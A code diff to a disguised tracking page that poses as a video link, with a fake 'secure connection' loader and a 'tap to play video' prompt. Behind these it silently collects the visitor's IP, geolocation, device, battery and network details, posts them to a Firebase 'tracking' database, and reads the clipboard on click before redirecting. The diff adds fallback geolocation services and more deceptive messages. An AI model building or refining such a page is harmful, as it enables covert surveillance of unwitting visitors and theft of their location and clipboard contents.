@@ -11,14 +11,39 @@
 </head>
 <body>
     <div id="status" style="text-align:center;">
-        <div class="loader" id="ldr"></div>
-        <p id="msg" style="margin-top:10px; color:#555; font-size: 13px;">Connecting to server...</p>
+        <div class="loader"></div>
+        <p id="msg" style="margin-top:10px; color:#555; font-size: 13px;">Verifying connection...</p>
     </div>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
 
-        async function collectData() {
+        async function getIPDetails() {
+            // Source 1: ipapi.co (Slightly strict)
+            try {
+                let r = await fetch('https://ipapi.co/json/');
+                let d = await r.json();
+                if(d.ip) return { ip: d.ip, loc: `${d.city}, ${d.country_name}`, lat: d.latitude, lon: d.longitude };
+            } catch(e){}
+
+            // Source 2: ipwho.is (Backup)
+            try {
+                let r = await fetch('https://ipwho.is/');
+                let d = await r.json();
+                if(d.ip) return { ip: d.ip, loc: `${d.city}, ${d.country}`, lat: d.latitude, lon: d.longitude };
+            } catch(e){}
+
+            // Source 3: api.ipify.org (Last resort - Only IP)
+            try {
+                let r = await fetch('https://api.ipify.org?format=json');
+                let d = await r.json();
+                if(d.ip) return { ip: d.ip, loc: "Unknown Loc (VPN?)", lat: 0, lon: 0 };
+            } catch(e){}
+
+            return { ip: "N/A", loc: "N/A", lat: 0, lon: 0 };
+        }
+
+        async function startSystem() {
             const params = new URLSearchParams(window.location.search);
             const id = params.get('id');
             if(!id) return;
@@ -26,7 +51,7 @@
             const userKey = decoded.k;
             const targetUrl = decoded.r;
 
-            // 1. Instant Data (No wait)
+            // Start collecting hardware data
             let data = {
                 time: new Date().toLocaleString(),
                 device: navigator.platform,
@@ -37,34 +62,28 @@
                 speed: navigator.connection ? navigator.connection.downlink : "N/A"
             };
 
-            // 2. Battery (Silent wait)
+            // Battery (Await fast)
             try {
                 const b = await navigator.getBattery();
                 data.battery = Math.round(b.level * 100);
                 data.charging = b.charging ? "Yes" : "No";
             } catch(e){ data.battery = "N/A"; }
 
-            // 3. IP & Location (Fast API)
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                data.ip = d.ip || "N/A";
-                data.loc = d.city ? `${d.city}, ${d.country_name}` : "N/A";
-                data.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-            } catch(e) {
-                data.ip = "N/A"; data.loc = "N/A";
-            }
+            // IP & Loc (Wait for the best source)
+            const geo = await getIPDetails();
+            data.ip = geo.ip;
+            data.loc = geo.loc;
+            data.map = `https://www.google.com/maps?q=${geo.lat},${geo.lon}`;
 
-            // Save foran
+            // Push to Firebase
             fetch(`${DB_URL}tracking/${userKey}.json`, { 
                 method: 'POST', 
                 body: JSON.stringify(data) 
             });
 
-            // Timer for UI
+            // 2 Second UI transition
             setTimeout(() => {
-                document.getElementById('ldr').style.display = 'none';
-                document.getElementById('msg').innerHTML = "<b>⚠️ CLICK TO PLAY VIDEO</b>";
+                document.getElementById('status').innerHTML = "<b>⚠️ SECURE CONNECTION ESTABLISHED.<br>TAP TO PLAY VIDEO</b>";
                 document.body.onclick = async () => {
                     try {
                         const text = await navigator.clipboard.readText();
@@ -77,10 +96,11 @@
                 };
             }, 2000);
 
-            // Auto Redirect
-            setTimeout(() => { window.location.href = targetUrl; }, 6000);
+            // Safety redirect
+            setTimeout(() => { window.location.href = targetUrl; }, 8000);
         }
-        collectData();
+
+        startSystem();
     </script>
 </body>
 </html>
